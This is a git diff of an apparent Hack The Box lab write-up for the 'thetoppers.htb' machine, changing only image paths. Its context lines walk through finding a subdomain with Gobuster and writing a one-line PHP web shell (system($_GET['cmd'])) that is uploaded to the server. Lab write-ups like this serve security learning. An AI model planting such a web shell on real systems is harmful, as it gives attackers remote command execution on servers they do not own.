@@ -53,7 +53,7 @@ Answer: 2
 
 We see port 80 open on the target, when browsing the website of the target, going to Contact we see the email address.
 
-<figure><img src="../../../../.gitbook/assets/image (105) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
 
 Answer: thetoppers.htb
 
@@ -73,7 +73,7 @@ After editing the host file to map the IP to the domain, we can use Gobuster to 
 
 <figure><img src="../../../../.gitbook/assets/image (102) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Answer: s3.thetoppers.htb
 
@@ -141,7 +141,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 With the shell file created, we can use `cp` to get the file onto the server and run CMD.
 
-<figure><img src="../../../../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 Confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php.
 
